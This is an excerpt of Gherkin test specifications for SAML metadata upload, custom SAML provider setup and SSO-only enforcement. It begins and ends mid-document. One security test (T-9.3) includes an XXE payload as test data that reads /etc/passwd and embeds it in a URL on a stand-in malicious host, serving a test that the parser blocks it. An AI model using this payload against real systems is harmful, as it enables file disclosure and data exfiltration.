  </IDPSSODescriptor>
</EntityDescriptor>
```

**Preconditions:**
- User has organization admin role
- HTTPS validation is enforced

### T-9.2: Validate certificate expiration
**Maps to:** NFR-SEC
**Category:** security

```gherkin
  Scenario: Reject metadata with expired certificates
    Given I am logged in as an organization admin
    And I have SAML metadata with an expired certificate (expired 2023-12-31)
    When I upload the metadata file
    Then I should see "Invalid certificate: Certificate expired on 2023-12-31"
    And the upload should be rejected
    And I should see a link to certificate requirements documentation
```

**Test Data:**
- Certificate expiration date: 2023-12-31 (expired)
- Current date: 2024-01-15
- Certificate validation: Must check expiration against current date

**Preconditions:**
- User has organization admin role
- Certificate expiration validation is enforced

### T-9.3: Input sanitization for uploaded files
**Maps to:** NFR-SEC
**Category:** security

```gherkin
  Scenario: Sanitize and validate uploaded file content
    Given I am logged in as an organization admin
    And I have a file containing potentially malicious XML content with external entities
    When I upload the malicious file "xxe-attack.xml"
    Then the system should detect and block the external entity
    And I should see "Security error: External entities not allowed in metadata"
    And no external resources should be accessed
    And the upload should be rejected
```

**Test Data:**
```xml
<!-- xxe-attack.xml -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE EntityDescriptor [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata"
                  entityID="https://malicious.example.com">
  <IDPSSODescriptor protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol">
    <SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
                         Location="https://malicious.example.com/sso?data=&xxe;"/>
  </IDPSSODescriptor>
</EntityDescriptor>
```

**Preconditions:**
- User has organization admin role
- XML parser has XXE protection enabled

## Negative Tests

### T-NEG-1: Multiple simultaneous provider uploads
**Category:** concurrency

```gherkin
  Scenario: Handle multiple simultaneous provider uploads by same admin
    Given I am logged in as an organization admin
    And I have two browser tabs open to the SAML setup page
    When I upload different metadata files in both tabs simultaneously
    Then only one upload should succeed
    And the other should receive a conflict error
    And the system should maintain data consistency
```

### T-NEG-2: Upload during system maintenance
**Category:** availability

```gherkin
  Scenario: Handle upload attempts during system maintenance
    Given the SAML configuration service is in maintenance mode
    And I am logged in as an organization admin
    When I attempt to upload SAML metadata
    Then I should see "SAML configuration is temporarily unavailable due to maintenance"
    And the upload should be queued for retry after maintenance
```

## Boundary Tests

### T-BOUNDARY-1: Minimum valid metadata file
**Category:** boundary

```gherkin
  Scenario: Accept minimal but valid SAML metadata
    Given I am logged in as an organization admin
    And I have the smallest possible valid SAML metadata file (200 bytes)
    When I upload the minimal metadata file
    Then the upload should be accepted
    And basic provider information should be extracted
    And the provider should be configurable
```

### T-BOUNDARY-2: Maximum attribute count in metadata
**Category:** boundary

```gherkin
  Scenario: Handle metadata with maximum supported attributes
    Given I am logged in as an organization admin
    And I have SAML metadata with 50 attribute mappings (system maximum)
    When I upload the attribute-heavy metadata
    Then all attributes should be processed successfully
    And the provider configuration should include all attributes
    And performance should remain within acceptable limits
```


# Test Specifications: AUTH-SSO-002 — Custom SAML Provider Configuration

## Coverage Matrix
| AC | Test(s) | Category |
|----|---------|----------|
| AC-1 | T-1.1, T-1.2 | happy-path, boundary |
| AC-2 | T-2.1 | happy-path |
| AC-3 | T-3.1, T-3.2 | happy-path, edge-case |
| AC-4 | T-4.1, T-4.2, T-4.3 | error-handling |
| AC-5 | T-5.1, T-5.2 | boundary |
| AC-6 | T-6.1 | happy-path |
| AC-7 | T-7.1 | happy-path |
| AC-AUTH-1 | T-AUTH-1 | security |
| AC-AUTH-2 | T-AUTH-2 | security |

## Test Cases

### T-1.1: Upload valid SAML metadata XML file
**Maps to:** AC-1
**Category:** happy-path

```gherkin
Feature: Custom SAML Provider Configuration

  Scenario: Organization admin uploads valid SAML metadata XML file
    Given I am logged in as organization admin "admin@acme.com"
    And I am on the custom SAML provider configuration page
    And I have a valid SAML metadata XML file "okta-metadata.xml" (1.5MB, .xml extension)
    When I select the file from the file picker
    And I click "Upload Metadata"
    Then the system accepts the file upload
    And displays a preview showing:
      | Field | Value |
      | Entity ID | https://acme.okta.com/saml2/service-provider |
      | SSO URL | https://acme.okta.com/app/acme_app/exk1234567890/sso/saml |
      | Certificate Fingerprint | AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:AB:CD:EF:12 |
```

**Test Data:**
- Valid SAML metadata XML file with EntityDescriptor, SingleSignOnService, and X509Certificate elements
- File size: 1.5MB
- File extension: .xml
- Admin user with organization admin role

**Preconditions:**
- User has organization admin role
- User is authenticated
- Custom SAML configuration feature is enabled

### T-1.2: Upload metadata file at maximum size limit
**Maps to:** AC-1
**Category:** boundary

```gherkin
  Scenario: Organization admin uploads metadata file at 2MB size limit
    Given I am logged in as organization admin "admin@acme.com"
    And I am on the custom SAML provider configuration page
    And I have a valid SAML metadata XML file "large-metadata.xml" (exactly 2MB, .xml extension)
    When I select the file from the file picker
    And I click "Upload Metadata"
    Then the system accepts the file upload
    And displays extracted provider details preview
```

**Test Data:**
- Valid SAML metadata XML file exactly 2MB in size
- Admin user with organization admin role

**Preconditions:**
- User has organization admin role
- User is authenticated

### T-2.1: View manual configuration fields
**Maps to:** AC-2
**Category:** happy-path

```gherkin
  Scenario: Organization admin views manual SAML configuration form
    Given I am logged in as organization admin "admin@acme.com"
    And I am on the custom SAML provider configuration page
    When I view the configuration form
    Then I see the following manual input fields:
      | Field Name | Field Type | Required |
      | Entity ID | text input | yes |
      | SSO URL | URL input | yes |
      | SLO URL | URL input | no |
      | Certificate | textarea | yes |
      | Attribute Mapping Settings | fieldset | yes |
    And each field has appropriate validation hints
```

**Test Data:**
- Admin user with organization admin role

**Preconditions:**
- User has organization admin role
- User is authenticated
- On custom SAML configuration page

### T-3.1: Parse and validate complete SAML metadata
**Maps to:** AC-3
**Category:** happy-path

```gherkin
  Scenario: System parses and validates complete SAML metadata XML
    Given I am logged in as organization admin "admin@acme.com"
    And I am on the custom SAML provider configuration page
    And I have uploaded a complete SAML metadata XML file containing:
      | Element | Value |
      | EntityDescriptor entityID | https://provider.example.com |
      | SingleSignOnService Location | https://provider.example.com/sso |
      | SingleLogoutService Location | https://provider.example.com/slo |
      | X509Certificate | MIICertificateDataHere |
    When the system processes the uploaded file
    Then it successfully parses the XML
    And validates SAML 2.0 compliance
    And auto-populates manual fields with:
      | Field | Auto-populated Value |
      | Entity ID | https://provider.example.com |
      | SSO URL | https://provider.example.com/sso |
      | SLO URL | https://provider.example.com/slo |
      | Certificate | MIICertificateDataHere |
```

**Test Data:**
- Complete SAML metadata XML with all required and optional elements
- Valid X509 certificate data
- SAML 2.0 compliant structure

**Preconditions:**
- User has organization admin role
- User is authenticated
- Valid XML file has been selected for upload

### T-3.2: Parse SAML metadata with missing optional elements
**Maps to:** AC-3
**Category:** edge-case

```gherkin
  Scenario: System parses SAML metadata with missing optional SLO service
    Given I am logged in as organization admin "admin@acme.com"
    And I am on the custom SAML provider configuration page
    And I have uploaded SAML metadata XML containing only required elements:
      | Element | Value |
      | EntityDescriptor entityID | https://basic-provider.example.com |
      | SingleSignOnService Location | https://basic-provider.example.com/sso |
      | X509Certificate | MIIBasicCertDataHere |
    And the XML does not contain SingleLogoutService element
    When the system processes the uploaded file
    Then it successfully parses the XML
    And validates SAML 2.0 compliance
    And auto-populates manual fields with:
      | Field | Auto-populated Value |
      | Entity ID | https://basic-provider.example.com |
      | SSO URL | https://basic-provider.example.com/sso |
      | SLO URL | (empty) |
      | Certificate | MIIBasicCertDataHere |
```

**Test Data:**
- Minimal valid SAML metadata XML with only required elements
- No SingleLogoutService element present

**Preconditions:**
- User has organization admin role
- User is authenticated

### T-4.1: Handle invalid XML format
**Maps to:** AC-4
**Category:** error-handling

```gherkin
  Scenario: System handles malformed XML file upload
    Given I am logged in as organization admin "admin@acme.com"
    And I am on the custom SAML provider configuration page
    And I have a file "invalid.xml" containing malformed XML:
      """
      <EntityDescriptor>
        <SingleSignOnService Location="https://example.com"
        <!-- Missing closing tag and quote -->
      """
    When I upload the file
    Then the system displays error message "Invalid XML format at line 2: Missing closing quote for attribute 'Location'"
    And the file is not processed
    And the manual configuration fields remain empty
```

**Test Data:**
- Malformed XML file with syntax errors
- Line 2 contains the XML parsing error

**Preconditions:**
- User has organization admin role
- User is authenticated

### T-4.2: Handle non-SAML XML file
**Maps to:** AC-4
**Category:** error-handling

```gherkin
  Scenario: System rejects valid XML that is not SAML metadata
    Given I am logged in as organization admin "admin@acme.com"
    And I am on the custom SAML provider configuration page
    And I have a valid XML file "config.xml" containing:
      """
      <configuration>
        <setting name="timeout">30</setting>
        <setting name="retries">3</setting>
      </configuration>
      """
    When I upload the file
    Then the system displays error message "Not a valid SAML metadata file"
    And the file is not processed
```

**Test Data:**
- Valid XML file that is not SAML metadata format
- Contains no SAML-specific elements

**Preconditions:**
- User has organization admin role
- User is authenticated

### T-4.3: Handle SAML XML missing required elements
**Maps to:** AC-4
**Category:** error-handling

```gherkin
  Scenario: System rejects SAML XML missing required elements
    Given I am logged in as organization admin "admin@acme.com"
    And I am on the custom SAML provider configuration page
    And I have an XML file "incomplete-saml.xml" containing:
      """
      <EntityDescriptor xmlns="urn:oasis:names:tc:SAML:2.0:metadata">
        <!-- Missing SingleSignOnService element -->
        <KeyDescriptor use="signing">
          <KeyInfo xmlns="http://www.w3.org/2000/09/xmldsig#">
            <X509Data><X509Certificate>MIICert</X509Certificate></X509Data>
          </KeyInfo>
        </KeyDescriptor>
      </EntityDescriptor>
      """
    When I upload the file
    Then the system displays error message "Required SAML elements missing: SingleSignOnService"
    And the file is not processed
```

**Test Data:**
- SAML XML structure missing required SingleSignOnService element
- Contains valid EntityDescriptor and certificate elements

**Preconditions:**
- User has organization admin role
- User is authenticated

### T-5.1: Reject file exceeding size limit
**Maps to:** AC-5
**Category:** boundary

```gherkin
  Scenario: System rejects metadata file exceeding 2MB limit
    Given I am logged in as organization admin "admin@acme.com"
    And I am on the custom SAML provider configuration page
    And I have a metadata file "large-metadata.xml" (2.1MB, .xml extension)
    When I attempt to upload the file
    Then the system rejects the upload before processing
    And displays error message "File must be .xml format and under 2MB size limit"
    And no server-side processing occurs
```

**Test Data:**
- XML file exceeding 2MB limit (2.1MB)
- Valid .xml file extension

**Preconditions:**
- User has organization admin role
- User is authenticated

### T-5.2: Reject non-XML file type
**Maps to:** AC-5
**Category:** boundary

```gherkin
  Scenario: System rejects file with incorrect extension
    Given I am logged in as organization admin "admin@acme.com"
    And I am on the custom SAML provider configuration page
    And I have a file "metadata.txt" (0.5MB, .txt extension) containing valid SAML XML
    When I attempt to upload the file
    Then the system rejects the upload before processing
    And displays error message "File must be .xml format and under 2MB size limit"
    And no server-side processing occurs
```

**Test Data:**
- File with .txt extension containing valid SAML XML content
- File size under 2MB limit

**Preconditions:**
- User has organization admin role
- User is authenticated

### T-6.1: Configure provider name and description
**Maps to:** AC-6
**Category:** happy-path

```gherkin
  Scenario: Organization admin configures custom provider name and description
    Given I am logged in as organization admin "admin@acme.com"
    And I am on the custom SAML provider configuration page
    And I have completed the technical configuration
    When I enter provider details:
      | Field | Value |
      | Provider Name | Acme Corp Enterprise SSO |
      | Description | Primary authentication for Acme employees and contractors |
    And I save the configuration
    Then the custom provider is created with the specified name and description
    And end users will see "Acme Corp Enterprise SSO" as an authentication option
    And the description is visible to users during login selection
```

**Test Data:**
- Provider name: "Acme Corp Enterprise SSO"
- Description: "Primary authentication for Acme employees and contractors"

**Preconditions:**
- User has organization admin role
- User is authenticated
- SAML technical configuration is complete

### T-7.1: Preview configuration before save
**Maps to:** AC-7
**Category:** happy-path

```gherkin
  Scenario: Organization admin previews configuration before final save
    Given I am logged in as organization admin "admin@acme.com"
    And I am on the custom SAML provider configuration page
    And I have completed configuration with:
      | Field | Value |
      | Provider Name | Test Provider |
      | Entity ID | https://test.provider.com |
      | SSO URL | https://test.provider.com/sso |
      | SLO URL | https://test.provider.com/slo |
      | Certificate | MIITestCertificate |
    When I click "Preview Configuration"
    Then the system displays a configuration summary showing all settings
    And provides a "Test Connection" button
    And provides options to "Edit Configuration" or "Save Configuration"
    And no configuration is persisted until final save
```

**Test Data:**
- Complete SAML configuration with all fields populated
- Test provider details

**Preconditions:**
- User has organization admin role
- User is authenticated
- All required configuration fields are completed

## Security Tests

### T-AUTH-1: Unauthenticated access rejected
**Maps to:** AC-AUTH-1
**Category:** security

```gherkin
  Scenario: Unauthenticated user cannot access custom SAML configuration
    Given no authentication token is present in the request
    When I make a request to "/admin/saml/custom-providers"
    Then the system returns 401 Unauthorized
    And the response body contains error message "Authentication required"
    And no configuration data is returned
```

**Test Data:**
- Request without authentication token/session
- Custom SAML configuration endpoint

**Preconditions:**
- No user authentication session

### T-AUTH-2: Insufficient permissions rejected
**Maps to:** AC-AUTH-2
**Category:** security

```gherkin
  Scenario: Non-admin user cannot access custom SAML configuration
    Given I am logged in as regular user "user@acme.com" with role "member"
    When I make a request to "/admin/saml/custom-providers"
    Then the system returns 403 Forbidden
    And the response body contains error message "Organization admin permission required"
    And no configuration data is returned
```

**Test Data:**
- Authenticated user with "member" role (not organization admin)
- Valid authentication token

**Preconditions:**
- User is authenticated but lacks organization admin role

## Boundary Tests

### T-B-1: Maximum field length validation
**Maps to:** AC-6
**Category:** boundary

```gherkin
  Scenario: Provider name at maximum length limit
    Given I am logged in as organization admin "admin@acme.com"
    And I am on the custom SAML provider configuration page
    When I enter a provider name with exactly 100 characters: "This is a very long provider name that contains exactly one hundred characters for testing boundary"
    And I save the configuration
    Then the system accepts the provider name
    And saves the configuration successfully
```

**Test Data:**
- Provider name exactly 100 characters long
- All other valid configuration

**Preconditions:**
- User has organization admin role
- Valid SAML configuration completed

### T-B-2: Minimum required field validation
**Maps to:** AC-2, AC-3
**Category:** boundary

```gherkin
  Scenario: Configuration with minimum required fields only
    Given I am logged in as organization admin "admin@acme.com"
    And I am on the custom SAML provider configuration page
    When I configure only the minimum required fields:
      | Field | Value |
      | Provider Name | Min |
      | Entity ID | https://min.com |
      | SSO URL | https://min.com/sso |
      | Certificate | MII |
    And I leave SLO URL empty
    And I save the configuration
    Then the system accepts the minimal configuration
    And creates the provider successfully
```

**Test Data:**
- Minimal field values meeting minimum requirements
- Empty optional fields (SLO URL)

**Preconditions:**
- User has organization admin role
- User is authenticated


# Test Specifications: SSO-ENFORCEMENT — SSO-Only Authentication Enforcement

## Coverage Matrix
| AC | Test(s) | Category |
|----|---------|----------|
| AC-1 | T-1.1, T-1.2 | happy-path |
| AC-2 | T-2.1, T-2.2 | happy-path |
| AC-3 | T-3.1, T-3.2 | happy-path |
| AC-4 | T-4.1, T-4.2 | happy-path |
| AC-5 | T-5.1, T-5.2, T-5.3 | edge-case |
| AC-6 | T-6.1, T-6.2 | error-handling |
| AC-7 | T-7.1, T-7.2 | happy-path |
| AC-8 | T-8.1, T-8.2 | happy-path |
| AC-AUTH-1 | T-9.1, T-9.2 | security |
| AC-AUTH-2 | T-10.1, T-10.2 | security |

## Test Cases

### T-1.1: Toggle SSO Enforcement On Successfully
**Maps to:** AC-1
**Category:** happy-path

```gherkin
Feature: SSO Enforcement Configuration

  Scenario: Organization admin enables SSO enforcement
    Given I am authenticated as an organization admin with user ID "admin-001"
    And my organization "org-123" has an active SSO provider "okta-provider-456" configured
    And the organization has 15 users with email/password authentication
    And I am on the SSO enforcement settings page "/admin/sso/enforcement"
    When I click the SSO enforcement toggle switch
    Then the toggle displays "ON" state
    And a warning message appears: "Enabling SSO enforcement will block password authentication for all 15 organization users"
    And the toggle remains in pending state until confirmation
```

**Test Data:**
- Admin user: `{ id: "admin-001", email: "admin@org123.com", role: "organization_admin", org_id: "org-123" }`
- SSO provider: `{ id: "okta-provider-456", type: "SAML", status: "active", org_id: "org-123" }`
- Organization: `{ id: "org-123", name: "Test Corp", user_count: 15, sso_providers: ["okta-provider-456"] }`

**Preconditions:**
- Organization exists with active SSO provider
- Admin has organization_admin role
- At least one user in organization uses email/password auth

### T-1.2: Toggle SSO Enforcement Off Successfully
**Maps to:** AC-1
**Category:** happy-path

```gherkin
  Scenario: Organization admin disables SSO enforcement
    Given I am authenticated as an organization admin with user ID "admin-001"
    And my organization "org-123" has SSO enforcement currently enabled
    And I am on the SSO enforcement settings page "/admin/sso/enforcement"
    When I click the SSO enforcement toggle switch to disable
    Then the toggle displays "OFF" state
    And a warning message appears: "Disabling SSO enforcement will allow password authentication for all organization users"
    And the toggle remains in pending state until confirmation
```

**Test Data:**
- Same admin and org data as T-1.1
- Current SSO enforcement status: `{ enabled: true, enabled_at: "2026-06-01T10:00:00Z" }`

**Preconditions:**
- SSO enforcement is currently enabled for the organization

### T-2.1: Confirmation Dialog for Enabling SSO Enforcement
**Maps to:** AC-2
**Category:** happy-path

```gherkin
Feature: SSO Enforcement Confirmation

  Scenario: Confirmation dialog displays correct user count and requires typed confirmation
    Given I am authenticated as an organization admin with user ID "admin-001"
    And my organization "org-123" has 23 users currently using email/password authentication
    And I have toggled SSO enforcement to "enabled" (pending confirmation)
    When the confirmation dialog appears
    Then I see the message "This will affect 23 users in your organization"
    And I see an input field with placeholder text "Type ENABLE SSO to confirm"
    And the "Confirm" button is disabled until I type the exact text
    When I type "ENABLE SSO" in the confirmation field
    Then the "Confirm" button becomes enabled
    And clicking "Confirm" enables SSO enforcement permanently
```

**Test Data:**
- Organization with users: `{ id: "org-123", users_with_password_auth: 23, total_users: 25 }`
- Confirmation text: `"ENABLE SSO"` (case sensitive)

**Preconditions:**
- User has initiated SSO enforcement toggle
- Confirmation dialog is displayed

### T-2.2: Confirmation Dialog Cancellation
**Maps to:** AC-2
**Category:** happy-path

```gherkin
  Scenario: User cancels SSO enforcement confirmation
    Given I am authenticated as an organization admin with user ID "admin-001"
    And I have toggled SSO enforcement to "enabled" (pending confirmation)
    And the confirmation dialog is displayed
    When I click the "Cancel" button
    Then the dialog closes
    And the SSO enforcement toggle returns to "OFF" state
    And no changes are saved to the organization configuration
```

**Test Data:**
- Same org data as T-2.1

**Preconditions:**
- Confirmation dialog is open

### T-3.1: Password Authentication Blocked When SSO Enforced
**Maps to:** AC-3
**Category:** happy-path

```gherkin
Feature: SSO Authentication Enforcement

  Scenario: User from SSO-enforced organization blocked from password login
    Given organization "org-123" has SSO enforcement enabled
    And user "user-456" belongs to organization "org-123"
    And the user previously used email/password authentication
    When the user attempts to log in with email "user@org123.com" and password "correctPassword123"
    Then the login attempt is rejected
    And the user is redirected to the SSO authentication page
    And the message displays: "Your organization requires SSO authentication"
    And the SSO provider login button for "okta-provider-456" is displayed
```

**Test Data:**
- User: `{ id: "user-456", email: "user@org123.com", org_id: "org-123", auth_method: "password" }`
- Organization: `{ id: "org-123", sso_enforcement_enabled: true, sso_provider: "okta-provider-456" }`
- Login attempt: `{ email: "user@org123.com", password: "correctPassword123" }`

**Preconditions:**
- SSO enforcement is active for the organization
- User has valid email/password credentials but enforcement blocks them

### T-3.2: SSO Authentication Allowed When Enforced
**Maps to:** AC-3
**Category:** happy-path

```gherkin
  Scenario: User successfully authenticates via SSO when enforcement is active
    Given organization "org-123" has SSO enforcement enabled
    And user "user-456" belongs to organization "org-123"
    When the user clicks "Login with SSO" and completes SAML authentication with the SSO provider
    And the SSO provider returns a valid assertion for user "user@org123.com"
    Then the user is successfully authenticated
    And the user session is created with SSO authentication method
    And the user is redirected to their dashboard
```

**Test Data:**
- SAML assertion: `{ nameID: "user@org123.com", org: "org-123", attributes: { role: "user" } }`
- Expected session: `{ user_id: "user-456", auth_method: "sso", provider: "okta-provider-456" }`

**Preconditions:**
- SSO provider is responding and configured correctly
- User has valid SSO identity

### T-4.1: Migration Notice Email Sent to Existing Users
**Maps to:** AC-4
**Category:** happy-path

```gherkin
Feature: User Migration Notifications

  Scenario: Existing password users receive migration notification email
    Given I am an organization admin with user ID "admin-001"
    And organization "org-123" has 12 users currently using email/password authentication
    When I enable SSO enforcement by confirming with "ENABLE SSO"
    Then SSO enforcement is activated immediately
    And migration notification emails are sent to all 12 affected users
    And each email contains the subject "Your organization now requires SSO authentication"
    And each email includes SSO login instructions specific to "okta-provider-456"
    And the email includes the SSO login URL "https://app.example.com/auth/sso/org-123"
```

**Test Data:**
- Affected users list: `[{ email: "user1@org123.com" }, { email: "user2@org123.com" }, ... ]` (12 users)
- Email template data: `{ org_name: "Test Corp", sso_provider: "okta-provider-456", sso_url: "https://app.example.com/auth/sso/org-123" }`

**Preconditions:**
- Email service is operational
- Users have valid email addresses
- SSO enforcement was just enabled

### T-4.2: Migration Notice Email Content Validation
**Maps to:** AC-4
**Category:** happy-path

```gherkin
  Scenario: Migration notification email contains required information
    Given SSO enforcement was just enabled for organization "org-123"
    And user "user-456" with email "user@org123.com" receives a migration notification
    When I examine the email content
    Then the email subject is "Your organization now requires SSO authentication"
    And the email body explains the SSO enforcement change
    And the email includes step-by-step SSO login instructions
    And the email contains the direct SSO login link "https://app.example.com/auth/sso/org-123"
    And the email includes contact information for IT support
```

**Test Data:**
- Email recipient: `{ email: "user@org123.com", name: "John Doe", org_id: "org-123" }`
- Expected email content includes SSO URL and support contact

**Preconditions:**
- User is registered in organization with valid email
- SSO enforcement was recently enabled

### T-5.1: Grace Period Allows Password Authentication with Warning
**Maps to:** AC-5
**Category:** edge-case

```gherkin
Feature: SSO Enforcement Grace Period

  Scenario: User can still authenticate with password during grace period
    Given organization "org-123" has SSO enforcement enabled with a 7-day grace period
    And the enforcement was enabled 3 days ago
    And user "user-456" belongs to organization "org-123" and previously used password authentication
    When the user attempts to log in with email "user@org123.com" and password "correctPassword123"
    Then the login attempt succeeds
    And the user session is created
    And a warning banner appears: "Your organization will require SSO authentication in 4 days. Please update your login method."
    And the banner includes a "Switch to SSO" button
```

**Test Data:**
- Organization grace period: `{ enabled_at: "2026-06-12T10:00:00Z", grace_period_days: 7, current_date: "2026-06-15T10:00:00Z" }`
- User: `{ id: "user-456", email: "user@org123.com", org_id: "org-123" }`
- Remaining grace days: 4

**Preconditions:**
- SSO enforcement is enabled with grace period
- Current time is within the grace period
- User has valid password credentials

### T-5.2: Grace Period Warning Shows Correct Countdown
**Maps to:** AC-5
**Category:** edge-case

```gherkin
  Scenario: Warning banner displays accurate grace period countdown
    Given organization "org-123" has SSO enforcement with 7-day grace period
    And the enforcement was enabled 6 days ago (1 day remaining)
    And user "user-456" logs in successfully with password during grace period
    When the user dashboard loads
    Then a prominent warning banner displays: "Your organization will require SSO authentication in 1 day. Please update your login method."
    And the banner has "urgent" styling with orange/red colors
    And clicking "Switch to SSO" redirects to SSO authentication flow
```

**Test Data:**
- Grace period timing: `{ enabled_at: "2026-06-09T10:00:00Z", grace_period_days: 7, current_date: "2026-06-15T09:00:00Z" }`
- Remaining time: 1 day, 1 hour

**Preconditions:**
- Grace period is nearly expired (< 24 hours remaining)
- User has active session from password authentication

### T-5.3: Grace Period Expires and Blocks Password Authentication
**Maps to:** AC-5
**Category:** edge-case

```gherkin
  Scenario: Password authentication blocked after grace period expires
    Given organization "org-123" had SSO enforcement with 7-day grace period
    And the grace period expired 1 hour ago
    And user "user-456" previously could authenticate with password during grace period
    When the user attempts to log in with email "user@org123.com" and password "correctPassword123"
    Then the login attempt is rejected
    And the user is redirected to SSO authentication
    And the message displays: "Your organization's SSO enforcement grace period has expired. SSO authentication is now required."
```

**Test Data:**
- Grace period expired: `{ enabled_at: "2026-06-08T10:00:00Z", grace_period_days: 7, current_date: "2026-06-15T11:00:00Z" }`
- User with previous password access during grace period

**Preconditions:**
- Grace period has completely expired
- User attempts password authentication post-expiration

### T-6.1: SSO Provider Unavailable Error Handling
**Maps to:** AC-6
**Category:** error-handling

```gherkin
Feature: SSO Provider Availability

  Scenario: User receives helpful error when SSO provider is down
    Given organization "org-123" has SSO enforcement enabled
    And user "user-456" belongs to organization "org-123"
    And the SSO provider "okta-provider-456" is currently unreachable (503 Service Unavailable)
    When the user attempts SSO authentication
    And the system fails to connect to the SSO provider after 3 retry attempts
    Then the user sees the error message: "SSO provider temporarily unavailable. Contact your administrator for assistance"
    And the error includes a support contact link
    And the failure is logged with details: timestamp, user ID, provider ID, and error code
    And an alert is sent to organization admins about the SSO provider failure
```

**Test Data:**
- SSO provider status: `{ id: "okta-provider-456", status: "unreachable", last_error: "503 Service Unavailable" }`
- Error log entry: `{ timestamp: "2026-06-15T10:30:00Z", user_id: "user-456", provider_id: "okta-provider-456", error: "CONNECTION_TIMEOUT", retry_count: 3 }`

**Preconditions:**
- SSO provider is genuinely unavailable (network/service issue)
- User is attempting legitimate SSO authentication

### T-6.2: SSO Provider Timeout Handling
**Maps to:** AC-6
**Category:** error-handling

```gherkin
  Scenario: SSO authentication times out and displays appropriate error
    Given organization "org-123" has SSO enforcement enabled
    And user "user-456" initiates SSO authentication
    And the SSO provider "okta-provider-456" responds slowly (>30 second response time)
    When the authentication request times out after 30 seconds
    Then the user sees the error: "SSO provider temporarily unavailable. Contact your administrator for assistance"
    And the timeout is logged as an admin-visible incident
    And the user is given an option to retry authentication
    And organization admins receive an automated alert about provider performance issues
```

**Test Data:**
- Timeout threshold: 30 seconds
- Provider response time: >30 seconds
- Alert recipients: all users with organization_admin role in org-123

**Preconditions:**
- SSO provider is responding but extremely slowly
- User has been waiting for authentication completion

### T-7.1: Enforcement Status Display for Enabled State
**Maps to:** AC-7
**Category:** happy-path

```gherkin
Feature: SSO Enforcement Status Display

  Scenario: Admin views detailed enforcement status when enabled
    Given I am authenticated as an organization admin with user ID "admin-001"
    And organization "org-123" has SSO enforcement enabled since "2026-06-10T14:30:00Z"
    And the organization has 18 total users with 3 users still using password authentication
    When I navigate to the SSO settings page "/admin/sso/enforcement"
    Then I see the enforcement status: "Enabled"
    And I see "Affected users: 18 total users"
    And I see "Users still on password: 3"
    And I see "Last changed: June 10, 2026 at 2:30 PM by admin@org123.com"
    And I see "Grace period: Active (2 days remaining)" if grace period is configured
```

**Test Data:**
- Enforcement details: `{ enabled: true, enabled_at: "2026-06-10T14:30:00Z", enabled_by: "admin@org123.com", grace_period_days: 7 }`
- User statistics: `{ total_users: 18, password_auth_users: 3, sso_auth_users: 15 }`
- Current timestamp: "2026-06-15T10:00:00Z" (for grace period calculation)

**Preconditions:**
- Admin has proper permissions to view enforcement settings
- SSO enforcement is currently active

### T-7.2: Enforcement Status Display for Disabled State
**Maps to:** AC-7
**Category:** happy-path

```gherkin
  Scenario: Admin views enforcement status when disabled
    Given I am authenticated as an organization admin with user ID "admin-001"
    And organization "org-123" has SSO enforcement disabled
    And the enforcement was last disabled on "2026-06-01T09:15:00Z"
    And the organization has 18 total users with 12 users using password authentication
    When I navigate to the SSO settings page "/admin/sso/enforcement"
    Then I see the enforcement status: "Disabled"
    And I see "Total users: 18"
    And I see "Password authentication: Available for all users"
    And I see "Last changed: June 1, 2026 at 9:15 AM by admin2@org123.com"
    And the "Enable SSO Enforcement" toggle is available and in OFF position
```

**Test Data:**
- Enforcement details: `{ enabled: false, last_disabled_at: "2026-06-01T09:15:00Z", last_disabled_by: "admin2@org123.com" }`
- User auth methods: `{ total_users: 18, password_auth_users: 12, sso_auth_users: 6 }`

**Preconditions:**
- SSO enforcement is currently disabled
- Admin is viewing the settings page

### T-8.1: Disabling SSO Enforcement Re-enables Password Authentication
**Maps to:** AC-8
**Category:** happy-path

```gherkin
Feature: SSO Enforcement Disabling

  Scenario: Admin successfully disables SSO enforcement
    Given I am authenticated as an organization admin with user ID "admin-001"
    And organization "org-123" currently has SSO enforcement enabled
    And there are 15 users affected by the current enforcement
    When I toggle SSO enforcement to "disabled"
    And I confirm the action in the confirmation dialog
    Then SSO enforcement is immediately disabled
    And password authentication is restored for all organization users
    And the enforcement status updates to "Disabled"
    And notification emails are sent to all 15 affected users
    And each email confirms that password authentication is now available again
```

**Test Data:**
- Organization: `{ id: "org-123", sso_enforcement_enabled: true, affected_users: 15 }`
- Email recipients: all users in org-123 with any authentication method
- Notification email subject: "Password authentication restored for your organization"

**Preconditions:**
- SSO enforcement is currently active
- Admin has permission to modify enforcement settings
- Users are currently restricted to SSO-only authentication

### T-8.2: Notification Email Content When Enforcement Disabled
**Maps to:** AC-8
**Category:** happy-path

```gherkin
  Scenario: Users receive proper notification when enforcement is disabled
    Given SSO enforcement was just disabled for organization "org-123"
    And user "user-456" with email "user@org123.com" receives a restoration notification
    When I examine the notification email
    Then the email subject is "Password authentication restored for your organization"
    And the email explains that SSO enforcement has been disabled
    And the email confirms that password login is now available again
    And the email includes the standard login URL "https://app.example.com/login"
    And the email mentions that SSO authentication remains available as an option
```

**Test Data:**
- Email recipient: `{ email: "user@org123.com", name: "John Doe", org_id: "org-123" }`
- Login URLs: standard login and SSO login both available

**Preconditions:**
- SSO enforcement was recently disabled
- User has a registered email address
- Email delivery system is operational

## Negative Tests

### T-11.1: Toggle SSO Enforcement Without Active SSO Provider
**Maps to:** AC-1
**Category:** error-handling

```gherkin
Feature: SSO Enforcement Error Conditions

  Scenario: Admin cannot enable enforcement without active SSO provider
    Given I am authenticated as an organization admin with user ID "admin-001"
    And my organization "org-123" has no active SSO providers configured
    When I attempt to toggle SSO enforcement to "enabled"
    Then the toggle action is blocked
    And I see the error message: "SSO enforcement requires at least one active SSO provider. Please configure SSO first."
    And the toggle remains in "OFF" position
    And I am redirected to SSO provider configuration page
```

**Test Data:**
- Organization: `{ id: "org-123", sso_providers: [], active_sso_providers: 0 }`

### T-11.2: Incorrect Confirmation Text
**Maps to:** AC-2
**Category:** error-handling

```gherkin
  Scenario: Confirmation fails with incorrect typed text
    Given I am attempting to enable SSO enforcement
    And the confirmation dialog is displayed requiring "ENABLE SSO"
    When I type "enable sso" (incorrect case) in the confirmation field
    Then the "Confirm" button remains disabled
    And the input field shows validation error styling
